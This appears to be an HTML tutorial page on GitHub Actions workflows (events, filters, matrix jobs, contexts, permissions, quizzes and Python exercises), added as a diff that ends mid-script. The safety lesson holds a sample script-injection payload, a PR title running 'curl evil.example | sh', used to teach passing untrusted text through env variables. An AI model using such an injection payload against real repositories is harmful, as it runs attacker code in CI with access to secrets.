@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GitHub Actions: events, jobs, matrix and contexts · Git and CI/CD</title>
+<meta name="description" content="workflow files, on with push, pull_request, workflow_dispatch and schedule, branch, tag and path filters, cron in UTC, jobs, runs-on, steps, uses, run and with, needs and if, matrix with include, exclude and fail-fast, contexts and expressions, GITHUB_OUTPUT, permissions and GITHUB_TOKEN, concurrency, timeouts, environments, script injection and forks.">
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/theme.css">
+<link rel="stylesheet" href="../../assets/learn.css">
+<link rel="stylesheet" href="../../assets/cv.css">
+<link rel="stylesheet" href="../../assets/git.css">
+</head>
+<body class="cvp gitp" data-fxh="Command sheet">
+<header class="cv-top"><a class="cv-brand" href="../../index.html">Brainy Bytes</a><a class="cv-home" href="../../subject.html?s=git">Git and CI/CD learning path</a><span class="grow"></span><button type="button" class="cv-theme" id="cvTheme">Dark mode</button></header>
+<div class="cv-wrap">
+  <div class="cv-crumb"><a class="home-link" href="../../subject.html?s=git" target="_top">Git and CI/CD</a><span>›</span><span>Step 7: GitHub Actions</span><span>›</span><span>Actions concepts</span></div>
+  <header class="cv-hero">
+    <div class="cv-kicker">Step 7 · Topic 1 of 1 · Intermediate</div>
+    <h1>GitHub Actions: events, jobs, matrix and contexts</h1>
+    <p class="lead">Read and write any GitHub Actions workflow: which event starts it, how filters decide, how jobs depend on each other, how a matrix multiplies jobs, how data flows through contexts and outputs, and how to keep it secure.</p>
+    <div class="cv-chips"><span class="cv-chip">About 55 min</span><span class="cv-chip">4 lessons</span><span class="cv-chip">2 animations</span><span class="cv-chip">7 command cards</span><span class="cv-chip">6 worked problems</span><span class="cv-chip">10 quiz questions</span><span class="cv-chip">2 assignments</span><a class="cv-chip cv-sheet" href="./cheatsheet.html#gha-concepts" data-topic="cheatsheet" data-h="gha-concepts">This chapter on the cheatsheet</a></div>
+  </header>
+  <nav class="cv-tabs" role="tablist" aria-label="Parts of this chapter"><button type="button" class="cv-tab" role="tab" data-tab="learn">Learn</button><button type="button" class="cv-tab" role="tab" data-tab="formulas">Commands</button><button type="button" class="cv-tab" role="tab" data-tab="problems">Worked problems</button><button type="button" class="cv-tab" role="tab" data-tab="quiz">Quiz</button><button type="button" class="cv-tab" role="tab" data-tab="assign">Assignments</button><button type="button" class="cv-tab" role="tab" data-tab="summary">Summary</button></nav>
+  <section class="cv-pane" data-pane="learn" role="tabpanel">
+    <ol class="cv-stepper" aria-label="Lessons"><li><a href="#anatomy" data-l="anatomy"><span class="n">1</span><span class="t">A workflow file, line by line</span></a></li><li><a href="#events" data-l="events"><span class="n">2</span><span class="t">Events and filters: when does it run</span></a></li><li><a href="#jobs" data-l="jobs"><span class="n">3</span><span class="t">Jobs, needs, if, matrix and outputs</span></a></li><li><a href="#safety" data-l="safety"><span class="n">4</span><span class="t">Permissions, concurrency and safe workflows</span></a></li></ol>
+    <article class="cv-lesson" id="anatomy" data-l="anatomy" hidden><div class="cv-lno">Lesson 1 of 4</div><h2>A workflow file, line by line</h2>
+<p>A <b>workflow</b> is a YAML file in <code>.github/workflows/</code>. It says <b>when</b> to run (on), <b>where</b> (runs-on) and <b>what</b> (steps). This is the smallest useful one.</p>
+<div class="cv-code gk-file" data-lang="yaml"><div class="cc-bar"><span class="gk-path">.github/workflows/hello.yml</span><span class="grow"></span><button type="button" class="gk-copy">Copy</button></div><pre class="cc-src gk-hl" data-hl="yaml"><span class="ln gk-has" data-n="1">name: Hello CI</span><span class="ln gk-has" data-n="2">on:</span><span class="ln" data-n="3">  push:</span><span class="ln gk-has" data-n="4">    branches: [main]</span><span class="ln gk-has" data-n="5">  pull_request:</span><span class="ln" data-n="6">jobs:</span><span class="ln gk-has" data-n="7">  test:</span><span class="ln gk-has" data-n="8">    runs-on: ubuntu-latest</span><span class="ln" data-n="9">    steps:</span><span class="ln gk-has" data-n="10">      - uses: actions/checkout@v7</span><span class="ln" data-n="11">      - uses: actions/setup-python@v7</span><span class="ln gk-has" data-n="12">        with:</span><span class="ln gk-has" data-n="13">          python-version: '3.13'</span><span class="ln" data-n="14">      - name: Say hello</span><span class="ln gk-has" data-n="15">        run: |</span><span class="ln" data-n="16">          python --version</span><span class="ln gk-has" data-n="17">          echo "Commit ${{ github.sha }} on ${{ github.ref_name }}"</span></pre><details class="gk-notes" open><summary>What each marked line does and why</summary><ol><li data-n="1"><b>Line 1</b><code>name: Hello CI</code><span>The name shown in the Actions tab.</span></li><li data-n="2"><b>Line 2</b><code>on:</code><span>The events that start this workflow.</span></li><li data-n="4"><b>Line 4</b><code>branches: [main]</code><span>Only pushes to main. Pushes to other branches are ignored.</span></li><li data-n="5"><b>Line 5</b><code>pull_request:</code><span>Every pull request, from any branch, to any base branch.</span></li><li data-n="7"><b>Line 7</b><code>test:</code><span>A job id. Use letters, digits, - and _.</span></li><li data-n="8"><b>Line 8</b><code>runs-on: ubuntu-latest</code><span>The runner image. ubuntu-latest, windows-latest and macos-latest are GitHub hosted.</span></li><li data-n="10"><b>Line 10</b><code>- uses: actions/checkout@v7</code><span>uses runs a ready made action. checkout clones your repository into the runner. Without it the runner has no files.</span></li><li data-n="12"><b>Line 12</b><code>with:</code><span>with passes inputs to the action.</span></li><li data-n="13"><b>Line 13</b><code>python-version: '3.13'</code><span>Quoted, or YAML reads 3.10 as 3.1.</span></li><li data-n="15"><b>Line 15</b><code>run: |</code><span>run executes shell commands. The | keeps several lines.</span></li><li data-n="17"><b>Line 17</b><code>echo "Commit ${{ github.sha }} on ${{ github.ref_name }}"</code><span>${{ }} is an expression. github is a context with facts about the run.</span></li></ol></details></div>
+<div class="tw"><table class="cvt "><thead><tr><th>Key</th><th>Level</th><th>Meaning</th></tr></thead><tbody><tr><td><code>on</code></td><td>workflow</td><td>events and filters</td></tr><tr><td><code>permissions</code></td><td>workflow or job</td><td>what the automatic GITHUB_TOKEN may do</td></tr><tr><td><code>env</code></td><td>workflow, job or step</td><td>environment variables</td></tr><tr><td><code>concurrency</code></td><td>workflow or job</td><td>at most one run per group, optionally cancel the older one</td></tr><tr><td><code>runs-on</code></td><td>job</td><td>which runner</td></tr><tr><td><code>needs</code>, <code>if</code></td><td>job</td><td>order and conditions</td></tr><tr><td><code>strategy.matrix</code></td><td>job</td><td>many jobs from one definition</td></tr><tr><td><code>timeout-minutes</code></td><td>job or step</td><td>cancel after this many minutes. The job default is 360</td></tr><tr><td><code>uses</code> or <code>run</code>, <code>with</code>, <code>id</code></td><td>step</td><td>an action or shell commands, inputs, a name to read outputs</td></tr></tbody></table></div>
+<nav class="cv-lnav"></nav></article><article class="cv-lesson" id="events" data-l="events" hidden><div class="cv-lno">Lesson 2 of 4</div><h2>Events and filters: when does it run</h2>
+<p>The <code>on</code> section decides which events start a run. Filters narrow it down by branch, tag or changed path. Type an event, a branch and the changed files, and the animation tells you whether the workflow runs and which rule decided.</p>
+<div class="cvz" data-viz="trigger"></div>
+<div class="tw"><table class="cvt "><thead><tr><th>Event</th><th>Starts when</th><th>Good for</th></tr></thead><tbody><tr><td><code>push</code></td><td>commits or tags are pushed</td><td>CI on main, release on tags</td></tr><tr><td><code>pull_request</code></td><td>a PR is opened, gets new commits (synchronize) or is reopened, by default</td><td>checking a change before merge. The run tests the merge result of the PR with its base</td></tr><tr><td><code>workflow_dispatch</code></td><td>someone presses Run workflow, or calls the API or gh workflow run</td><td>manual QA runs with inputs</td></tr><tr><td><code>schedule</code></td><td>a cron time in UTC, on the default branch only</td><td>nightly regression</td></tr><tr><td><code>workflow_run</code></td><td>another workflow finished</td><td>chaining a QA workflow after CI</td></tr></tbody></table></div>
+<div class="fx-grid"><div class="fx fx-key"><div class="fx-h"><span>Branch and tag filters</span><span class="fx-tag">Exam favourite</span></div><div class="fx-b"><code>branches: [main, 'release/**']</code>, <code>tags: ['v*']</code></div><div class="fx-n">* matches any characters except /, ** also matches /.</div></div><div class="fx"><div class="fx-h"><span>Path filters</span></div><div class="fx-b"><code>paths: ['app/**']</code>, <code>paths-ignore: ['docs/**', '**.md']</code></div><div class="fx-n">Skip the run when only docs changed. Use paths or paths-ignore for one event, not both.</div></div><div class="fx fx-key"><div class="fx-h"><span>Cron</span><span class="fx-tag">Exam favourite</span></div><div class="fx-b"><code>- cron: '30 2 * * 1-5'</code></div><div class="fx-n">Minute, hour, day of month, month, day of week. This is 02:30 UTC Monday to Friday.</div></div></div>
+<div class="note note-warn"><b>Common mistake</b><div>A workflow added on a feature branch with on: push: branches: [main] does not run for pushes to that feature branch. Beginners often think CI is broken. Add pull_request, open a PR, or push to main.</div></div>
+<div class="note note-tip"><b>Remember</b><div>Scheduled runs can start late when GitHub is busy, especially at the top of the hour. Pick an odd minute such as 2:30 rather than 0:00.</div></div>
+<nav class="cv-lnav"></nav></article><article class="cv-lesson" id="jobs" data-l="jobs" hidden><div class="cv-lno">Lesson 3 of 4</div><h2>Jobs, needs, if, matrix and outputs</h2>
+<p>Jobs run in parallel unless one <b>needs</b> another. A <b>matrix</b> runs the same job for every combination of values, for example every operating system with every Python version.</p>
+<div class="cvz" data-viz="matrix"></div>
+<div class="cv-code" data-k="matrix"></div>
+<div class="cv-code gk-file" data-lang="yaml"><div class="cc-bar"><span class="gk-path">jobs-example.yml</span><span class="grow"></span><button type="button" class="gk-copy">Copy</button></div><pre class="cc-src gk-hl" data-hl="yaml"><span class="ln" data-n="1">jobs:</span><span class="ln" data-n="2">  test:</span><span class="ln" data-n="3">    strategy:</span><span class="ln gk-has" data-n="4">      fail-fast: false</span><span class="ln" data-n="5">      matrix:</span><span class="ln" data-n="6">        os: [ubuntu-latest, windows-latest]</span><span class="ln" data-n="7">        python: ['3.12', '3.13']</span><span class="ln gk-has" data-n="8">    runs-on: ${{ matrix.os }}</span><span class="ln" data-n="9">    steps:</span><span class="ln" data-n="10">      - uses: actions/checkout@v7</span><span class="ln" data-n="11">      - uses: actions/setup-python@v7</span><span class="ln" data-n="12">        with:</span><span class="ln" data-n="13">          python-version: ${{ matrix.python }}</span><span class="ln" data-n="14">      - id: ver</span><span class="ln gk-has" data-n="15">        run: echo "tag=v$(date +%Y%m%d)" &gt;&gt; "$GITHUB_OUTPUT"</span><span class="ln" data-n="16">  release:</span><span class="ln gk-has" data-n="17">    needs: test</span><span class="ln gk-has" data-n="18">    if: github.ref == 'refs/heads/main' &amp;&amp; github.event_name == 'push'</span><span class="ln" data-n="19">    runs-on: ubuntu-latest</span><span class="ln" data-n="20">    steps:</span><span class="ln" data-n="21">      - run: echo "Releasing"</span></pre><details class="gk-notes" open><summary>What each marked line does and why</summary><ol><li data-n="4"><b>Line 4</b><code>fail-fast: false</code><span>Default true: one failing combination cancels the others. false lets every combination finish, which QA usually wants for a full picture.</span></li><li data-n="8"><b>Line 8</b><code>runs-on: ${{ matrix.os }}</code><span>The matrix value chooses the runner.</span></li><li data-n="15"><b>Line 15</b><code>run: echo "tag=v$(date +%Y%m%d)" &gt;&gt; "$GITHUB_OUTPUT"</code><span>A step writes name=value lines to the file in $GITHUB_OUTPUT. Later steps read steps.ver.outputs.tag.</span></li><li data-n="17"><b>Line 17</b><code>needs: test</code><span>release waits for every matrix job of test.</span></li><li data-n="18"><b>Line 18</b><code>if: github.ref == 'refs/heads/main' &amp;&amp; github.event_name == 'push'</code><span>Run only for pushes to main, never for pull requests.</span></li></ol></details></div>
+<div class="tw"><table class="cvt "><thead><tr><th>Context</th><th>Example</th><th>Holds</th></tr></thead><tbody><tr><td><code>github</code></td><td><code>github.sha</code>, <code>github.ref_name</code>, <code>github.event_name</code></td><td>facts about the event and run</td></tr><tr><td><code>env</code>, <code>vars</code>, <code>secrets</code></td><td><code>secrets.DEPLOY_KEY</code></td><td>variables and encrypted secrets</td></tr><tr><td><code>matrix</code>, <code>strategy</code></td><td><code>matrix.os</code></td><td>the current combination</td></tr><tr><td><code>steps</code>, <code>needs</code></td><td><code>needs.build.outputs.version</code></td><td>outputs of earlier steps and jobs</td></tr><tr><td><code>inputs</code></td><td><code>inputs.ci_run_id</code></td><td>workflow_dispatch inputs</td></tr><tr><td><code>runner</code></td><td><code>runner.os</code></td><td>Linux, Windows or macOS</td></tr></tbody></table></div>
+<div class="note note-exam"><b>In the exam</b><div>A matrix can produce at most 256 jobs per workflow run. Six operating systems times six Python versions times eight databases is already 288.</div></div>
+<nav class="cv-lnav"></nav></article><article class="cv-lesson" id="safety" data-l="safety" hidden><div class="cv-lno">Lesson 4 of 4</div><h2>Permissions, concurrency and safe workflows</h2>
+<div class="fx-grid"><div class="fx fx-key"><div class="fx-h"><span>Least privilege token</span><span class="fx-tag">Exam favourite</span></div><div class="fx-b"><code>permissions:
+  contents: read</code></div><div class="fx-n">Every run gets a GITHUB_TOKEN. Set only what the jobs need. Add actions: read to download artifacts from other runs, packages: write to publish packages.</div></div><div class="fx fx-key"><div class="fx-h"><span>One run per branch</span><span class="fx-tag">Exam favourite</span></div><div class="fx-b"><code>concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true</code></div><div class="fx-n">A new push cancels the older run on the same branch, saving runner minutes.</div></div><div class="fx"><div class="fx-h"><span>Environments</span></div><div class="fx-b"><code>environment: qa</code> on a job</div><div class="fx-n">An environment can hold its own secrets and protection rules such as required reviewers before the job starts.</div></div><div class="fx"><div class="fx-h"><span>Debug logs</span></div><div class="fx-b">Re-run jobs with debug logging, or secret <code>ACTIONS_STEP_DEBUG</code> set to true</div><div class="fx-n">Shows extra output from actions.</div></div></div>
+<p><b>Script injection.</b> Text from a pull request title, branch name or issue is controlled by whoever opened it. If you paste it into a run line with <code>${{ }}</code>, it becomes part of your shell script.</p>
+<div class="cv-code gk-file" data-lang="yaml"><div class="cc-bar"><span class="gk-path">unsafe-and-safe.yml</span><span class="grow"></span><button type="button" class="gk-copy">Copy</button></div><pre class="cc-src gk-hl" data-hl="yaml"><span class="ln" data-n="1"># Unsafe: a PR titled  x"; curl evil.example | sh; echo "  runs that command</span><span class="ln gk-has" data-n="2">- run: echo "Title: ${{ github.event.pull_request.title }}"</span><span class="ln" data-n="3"># Safe: pass it as an environment variable, the shell treats it as data</span><span class="ln" data-n="4">- env:</span><span class="ln gk-has" data-n="5">    TITLE: ${{ github.event.pull_request.title }}</span><span class="ln" data-n="6">  run: echo "Title: $TITLE"</span></pre><details class="gk-notes" open><summary>What each marked line does and why</summary><ol><li data-n="2"><b>Line 2</b><code>- run: echo "Title: ${{ github.event.pull_request.title }}"</code><span>The expression is replaced before the shell runs, so quotes in the title end the string.</span></li><li data-n="5"><b>Line 5</b><code>TITLE: ${{ github.event.pull_request.title }}</code><span>An environment variable is never parsed as code.</span></li></ol></details></div>
+<div class="note note-warn"><b>Common mistake</b><div>Pull requests from forks get a read only GITHUB_TOKEN and no repository secrets. Do not switch to pull_request_target to work around this if the job runs code from the pull request, because that event runs with your secrets.</div></div>
+<div class="ladder"><div class="ld-h">One idea, four depths</div><div class="ld-tabs" role="tablist"><button type="button" class="ld-t on" data-ld="school">School</button><button type="button" class="ld-t" data-ld="college">College</button><button type="button" class="ld-t" data-ld="masters">Masters</button><button type="button" class="ld-t" data-ld="research">Research</button></div><div class="ld-p" data-ld="school"><p>A workflow file says when to run, on which machine and which steps. Jobs run side by side unless one needs another.</p></div><div class="ld-p" data-ld="college" hidden><p>Events with branch, tag and path filters start runs. Jobs have runs-on, needs, if and strategy.matrix. Steps use actions or run commands and pass data with GITHUB_OUTPUT. Contexts such as github, secrets and matrix fill ${{ }} expressions.</p></div><div class="ld-p" data-ld="masters" hidden><p>Security comes from least privilege permissions, SHA pinned actions, environment protection rules, never interpolating untrusted text into scripts and keeping fork PRs away from secrets.</p></div><div class="ld-p" data-ld="research" hidden><p>Reusable workflows (workflow_call), composite actions and OpenID Connect tokens let large organisations share pipelines and deploy to clouds without long lived secrets, a pattern also recommended by SLSA.</p></div></div>
+<nav class="cv-lnav"></nav></article>
+  </section>
+  <section class="cv-pane" data-pane="formulas" role="tabpanel" hidden></section><section class="cv-pane" data-pane="problems" role="tabpanel" hidden></section><section class="cv-pane" data-pane="quiz" role="tabpanel" hidden></section><section class="cv-pane" data-pane="assign" role="tabpanel" hidden></section><section class="cv-pane" data-pane="summary" role="tabpanel" hidden></section>
+  <nav class="cv-pager"><a class="prev" href="./cicd-basics.html" data-topic="cicd-basics"><small>Previous topic</small><b>CI/CD basics</b></a><a class="next" href="./interview-questions.html" data-topic="interview-questions"><small>Next</small><b>Interview Questions</b></a></nav>
+</div>
+<script type="application/json" id="cvdata">{"slug": "gha-concepts", "topic": "gha-concepts", "subject": "git", "title": "GitHub Actions: events, jobs, matrix and contexts", "codes": {"matrix": {"src": "# A matrix turns one job definition into one job per combination\noses = [\"ubuntu-latest\", \"windows-latest\", \"macos-latest\"]\npythons = [\"3.12\", \"3.13\"]\nexclude = [(\"macos-latest\", \"3.12\")]\ninclude = [(\"ubuntu-latest\", \"3.14\")]\n\njobs = [(o, p) for o in oses for p in pythons if (o, p) not in exclude]\nfor extra in include:\n    if extra not in jobs:\n        jobs.append(extra)\nfor o, p in jobs:\n    print(f\"test ({o}, {p})\")\nprint(len(jobs), \"jobs from one definition\")", "stdin": "", "out": "test (ubuntu-latest, 3.12)\ntest (ubuntu-latest, 3.13)\ntest (windows-latest, 3.12)\ntest (windows-latest, 3.13)\ntest (macos-latest, 3.13)\ntest (ubuntu-latest, 3.14)\n6 jobs from one definition"}}, "quiz": [{"lv": "e", "q": "In which folder must workflow files be?", "o": [".github/", ".github/workflows/", "workflows/", ".ci/"], "a": 1, "hint": "Exact path.", "why": "Files elsewhere are ignored."}, {"lv": "e", "q": "Which step clones your repository into the runner?", "o": ["actions/setup-python", "actions/checkout", "git init", "actions/cache"], "a": 1, "hint": "Check out.", "why": "Without it the runner has no files."}, {"lv": "e", "q": "Which event adds a Run workflow button?", "o": ["push", "workflow_dispatch", "schedule", "pull_request"], "a": 1, "hint": "Dispatch.", "why": "It can take inputs too."}, {"lv": "m", "q": "on: push: branches: [main]. You push to feature/x. Does the workflow run?", "o": ["Yes", "No", "Only with a tag", "Only on Fridays"], "a": 1, "hint": "Filter.", "why": "Only pushes to main match."}, {"lv": "m", "q": "Which time zone does schedule cron use?", "o": ["Your local time", "UTC", "The runner time zone", "US Pacific"], "a": 1, "hint": "Universal.", "why": "Convert your local time to UTC."}, {"lv": "m", "q": "What does fail-fast: true do in a matrix?", "o": ["Retries failures", "Cancels the other combinations when one fails", "Runs faster runners", "Skips tests"], "a": 1, "hint": "Stop early.", "why": "It is the default."}, {"lv": "m", "q": "How does a step pass a value to later steps?", "o": ["echo name=value >> \"$GITHUB_OUTPUT\"", "export name=value", "git config", "a secret"], "a": 0, "hint": "A special file.", "why": "Read it with steps.<id>.outputs.name."}, {"lv": "h", "q": "Why put github.event.pull_request.title in env instead of directly in run?", "o": ["It is shorter", "Direct use lets a crafted title inject shell commands", "env is faster", "run cannot read contexts"], "a": 1, "hint": "Injection.", "why": "The expression is pasted into the script before the shell runs."}, {"lv": "h", "q": "Does a pull request from a fork receive your repository secrets in a pull_request workflow?", "o": ["Yes", "No, only a read only GITHUB_TOKEN", "Only masked ones", "Only on main"], "a": 1, "hint": "Untrusted code.", "why": "This protects secrets from outside contributors."}, {"lv": "x", "q": "What is the largest number of jobs a matrix may generate per workflow run?", "o": ["64", "128", "256", "1000"], "a": 2, "hint": "A power of two.", "why": "GitHub documents a limit of 256."}], "calc": [{"lv": "e", "q": "Matrix: os has 3 values, python has 2. How many jobs?", "ans": "6", "hint": "Multiply.", "steps": ["Every os with every python.", "3 × 2.", "<span class=\"eq\">6 jobs<\/span>"]}, {"lv": "e", "q": "Same matrix with one exclude entry. How many jobs?", "ans": "5", "hint": "Subtract.", "steps": ["6 combinations.", "exclude removes 1.", "<span class=\"eq\">6 - 1 = 5 jobs<\/span>"]}, {"lv": "m", "q": "Same matrix, one exclude and one include of a new combination. How many jobs?", "ans": "6", "hint": "Add the new one.", "steps": ["After exclude: 5.", "include adds a combination that did not exist.", "<span class=\"eq\">5 + 1 = 6 jobs<\/span>"]}, {"lv": "m", "q": "Cron \"30 2 * * 1-5\". On how many days a week does it run?", "ans": "5", "hint": "Day of week field.", "steps": ["The fifth field is 1-5.", "1 is Monday, 5 is Friday.", "<span class=\"eq\">5 days<\/span>"]}, {"lv": "h", "q": "You want 08:00 IST (UTC+5:30) every day. What is the hour field in the cron line?", "ans": "2", "hint": "Subtract 5:30.", "steps": ["08:00 minus 5 hours 30 minutes.", "That is 02:30 UTC.", "<span class=\"eq\">cron \"30 2 * * *\", hour = 2<\/span>"]}, {"lv": "h", "q": "A job has no timeout-minutes. After how many hours is it cancelled?", "ans": "6", "hint": "Default 360 minutes.", "steps": ["The default timeout-minutes is 360.", "360 / 60.", "<span class=\"eq\">6 hours<\/span>"]}], "assign": [{"id": "branchmatch", "lv": "m", "title": "Does this branch filter match", "task": "<p>Write <code>matches(pattern, ref)<\/code> for GitHub branch filters. <code>*<\/code> matches any characters except <code>/<\/code>, <code>**<\/code> matches any characters including <code>/<\/code>, everything else must match exactly. Return True or False.<\/p>", "starter": "def matches(pattern, ref):\n    # your code here\n    pass\n", "tests": [{"call": "matches('main', 'main')", "want": true}, {"call": "matches('release/*', 'release/1.2')", "want": true}, {"call": "matches('release/*', 'release/1.2/hotfix')", "want": false}, {"call": "matches('release/**', 'release/1.2/hotfix')", "want": true}, {"call": "matches('feature-*', 'main')", "want": false}], "solution": "import re\n\ndef matches(pattern, ref):\n    rx = ''\n    i = 0\n    while i < len(pattern):\n        if pattern.startswith('**', i):\n            rx += '.*'\n            i += 2\n        elif pattern[i] == '*':\n            rx += '[^/]*'\n            i += 1\n        else:\n            rx += re.escape(pattern[i])\n            i += 1\n    return re.fullmatch(rx, ref) is not None\n", "hint": "Turn the pattern into a regular expression: ** becomes .* and * becomes [^/]*.", "why": "<p>GitHub also supports ?, + and [ ] in filters, and ! to exclude a pattern.<\/p>"}, {"id": "expand", "lv": "h", "title": "Expand a matrix", "task": "<p>Write <code>expand(axes, exclude, include)<\/code>. axes is a list of <code>[name, values]<\/code> pairs in order. exclude and include are lists of dicts. Return the list of combination dicts in order: the product of all axes without the excluded ones, then each include dict that is not already present.<\/p>", "starter": "def expand(axes, exclude, include):\n    # your code here\n    pass\n", "tests": [{"call": "expand([['os', ['u', 'w']], ['py', ['3.12', '3.13']]], [], [])", "want": [{"os": "u", "py": "3.12"}, {"os": "u", "py": "3.13"}, {"os": "w", "py": "3.12"}, {"os": "w", "py": "3.13"}]}, {"call": "len(expand([['os', ['u', 'w', 'm']], ['py', ['3.12', '3.13']]], [{'os': 'm', 'py': '3.12'}], [{'os': 'u', 'py': '3.14'}]))", "want": 6}, {"call": "expand([['os', ['u']]], [{'os': 'u'}], [{'os': 'u'}])", "want": [{"os": "u"}]}], "solution": "def expand(axes, exclude, include):\n    combos = [{}]\n    for name, values in axes:\n        combos = [dict(c, **{name: v}) for c in combos for v in values]\n    combos = [c for c in combos if c not in exclude]\n    for extra in include:\n        if extra not in combos:\n            combos.append(extra)\n    return combos\n", "hint": "Build the product one axis at a time, filter, then append.", "why": "<p>Real GitHub include rules can also add keys to existing combinations. This version covers the common case of adding new ones.<\/p>"}], "must": [["Workflow file", ".github/workflows/*.yml with on, jobs, runs-on, steps (uses or run). checkout first. Quote versions."], ["Events", "push and pull_request with branches, tags, paths filters, workflow_dispatch with inputs, schedule cron in UTC on the default branch. * stops at /, ** does not."], ["Jobs", "Parallel by default, needs for order, if for conditions, matrix for combinations (max 256, fail-fast default true). Outputs through $GITHUB_OUTPUT."], ["Contexts", "github, env, vars, secrets, matrix, steps, needs, inputs, runner inside ${{ }}."], ["Safety", "permissions least privilege, concurrency with cancel-in-progress, environments with reviewers, untrusted text through env only, fork PRs get no secrets, job timeout default 360 minutes."]], "summary": "<p>on decides when, runs-on where, steps what. needs orders jobs, matrix multiplies them, contexts fill expressions, and permissions plus env variables keep the run safe.<\/p>"}</script>
+<script type="application/json" id="cvtrace">{"matrix": {"steps": [{"l": 2, "ev": "line", "s": ["module"]}, {"l": 3, "ev": "line", "d": {"G.oses": "['ubuntu-latest', 'windows-latest', 'macos-latest']"}}, {"l": 4, "ev": "line", "d": {"G.pythons": "['3.12', '3.13']"}}, {"l": 5, "ev": "line", "d": {"G.exclude": "[('macos-latest', '3.12')]"}}, {"l": 7, "ev": "line", "d": {"G.include": "[('ubuntu-latest', '3.14')]"}}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 7, "ev": "line"}, {"l": 8, "ev": "line", "d": {"G.jobs": "[('ubuntu-latest', '3.12'), ('ubuntu-latest', '3.13'), ('windows-latest', '3.12'), ('wi..."}}, {"l": 9, "ev": "line", "d": {"G.extra": "('ubuntu-latest', '3.14')"}}, {"l": 10, "ev": "line"}, {"l": 8, "ev": "line"}, {"l": 11, "ev": "line"}, {"l": 12, "ev": "line", "d": {"G.o": "'ubuntu-latest'", "G.p": "'3.12'"}}, {"l": 11, "ev": "line", "o": "test (ubuntu-latest, 3.12)\n"}, {"l": 12, "ev": "line", "d": {"G.p": "'3.13'"}}, {"l": 11, "ev": "line", "o": "test (ubuntu-latest, 3.13)\n"}, {"l": 12, "ev": "line", "d": {"G.o": "'windows-latest'", "G.p": "'3.12'"}}, {"l": 11, "ev": "line", "o": "test (windows-latest, 3.12)\n"}, {"l": 12, "ev": "line", "d": {"G.p": "'3.13'"}}, {"l": 11, "ev": "line", "o": "test (windows-latest, 3.13)\n"}, {"l": 12, "ev": "line", "d": {"G.o": "'macos-latest'"}}, {"l": 11, "ev": "line", "o": "test (macos-latest, 3.13)\n"}, {"l": 12, "ev": "line", "d": {"G.o": "'ubuntu-latest'", "G.p": "'3.14'"}}, {"l": 11, "ev": "line", "o": "test (ubuntu-latest, 3.14)\n"}, {"l": 13, "ev": "line"}, {"l": 13, "ev": "return", "o": "6 jobs from one definition\n"}], "tail": "", "err": null, "cut": false}}</script>
+<script type="text/plain" id="cvtracer">"""Run one Python program and record it line by line for the "Line by line" viewer on the Python pages.
+
+The same file runs in two places:
+  at build time:  python3.14 pytrace.py main.py [stdin file]  ->  prints the recording as JSON
+  in the browser: assets/pyplay.js loads this source into Pyodide and calls record(source, stdin_text)
+
+A recording is {"steps": [...], "tail": text, "err": traceback text or null, "cut": bool}. Each step is
+{"l": line, "ev": "line" | "call" | "return", "s": call stack labels, "d": {name: repr or null}, "o": new output}.
+s, d and o appear only when something changed, to keep pages small. "tail" is output printed after the last step.
+"""
+import io
+import json
+import linecache
+import sys
+import traceback
+import types
+
+FILE = 'main.py'
+MAX_STEPS = 600
+
+
+def fmt(v, depth=0):
+    try:
+        if isinstance(v, (types.ModuleType, types.FunctionType, type, types.BuiltinFunctionType)):
+            return '<' + type(v).__name__ + ' ' + getattr(v, '__name__', '?') + '>'
+        r = repr(v)
+    except Exception as e:  # a broken __repr__ must not stop the recording
+        r = '<' + type(v).__name__ + ' (repr failed: ' + type(e).__name__ + ')>'
+    return r if len(r) <= 90 else r[:87] + '...'
+
+
+def visible(name, v):
+    if name.startswith('__') or name in ('_record_',):
+        return False
+    return not isinstance(v, types.ModuleType)
+
+
+def record(src, stdin_text=''):
+    steps, out = [], io.StringIO()
+    state = {'vars': {}, 'stack': None, 'olen': 0, 'cut': False}
+
+    def label(f):
+        return 'module' if f.f_code.co_name == '<module>' else f.f_code.co_name + '()'
+
+    def snap(frame, event):
+        if len(steps) >= MAX_STEPS:
+            state['cut'] = True
+            raise KeyboardInterrupt
+        frames, f = [], frame
+        while f is not None:
+            if f.f_code.co_filename == FILE:
+                frames.append(f)
+            f = f.f_back
+        frames.reverse()
+        st = {'l': frame.f_lineno, 'ev': event}
+        stack = [label(f) for f in frames]
+        if stack != state['stack']:
+            st['s'] = stack
+            state['stack'] = stack
+        cur = {}
+        for k, v in list(frames[0].f_globals.items()):
+            if visible(k, v):
+                cur['G.' + k] = fmt(v)
+        top = frames[-1]
+        if top.f_code.co_name != '<module>':
+            for k, v in list(top.f_locals.items()):
+                if visible(k, v):
+                    cur['L.' + k] = fmt(v)
+        d = {k: v for k, v in cur.items() if state['vars'].get(k) != v}
+        for k in state['vars']:
+            if k not in cur:
+                d[k] = None
+        if d:
+            st['d'] = d
+        state['vars'] = cur
+        o = out.getvalue()
+        if len(o) > state['olen']:
+            st['o'] = o[state['olen']:]
+            state['olen'] = len(o)
+        steps.append(st)
+
+    def tracer(frame, event, arg):
+        if frame.f_code.co_filename != FILE:
+            return None
+        if event in ('line', 'call', 'return') and not (event == 'call' and frame.f_code.co_name == '<module>'):
+            snap(frame, event)
+        return tracer
+
+    err = None
+    real_out, real_in = sys.stdout, sys.stdin
+    sys.stdout, sys.stdin = out, io.StringIO(stdin_text)
+    # Tracebacks read source lines through linecache, so give it the program text.
+    linecache.cache[FILE] = (len(src), None, src.splitlines(True), FILE)
+    try:
+        code = compile(src, FILE, 'exec')
+        sys.settrace(tracer)
+        try:
+            exec(code, {'__name__': '__main__'})
+        finally:
+            sys.settrace(None)
+    except KeyboardInterrupt:
+        pass
+    except SystemExit:
+        pass
+    except BaseException as e:
+        tb = e.__traceback__
+        while tb is not None and tb.tb_frame.f_code.co_filename != FILE:
+            tb = tb.tb_next
+        err = ''.join(traceback.format_exception(type(e), e, tb)).rstrip()
+    finally:
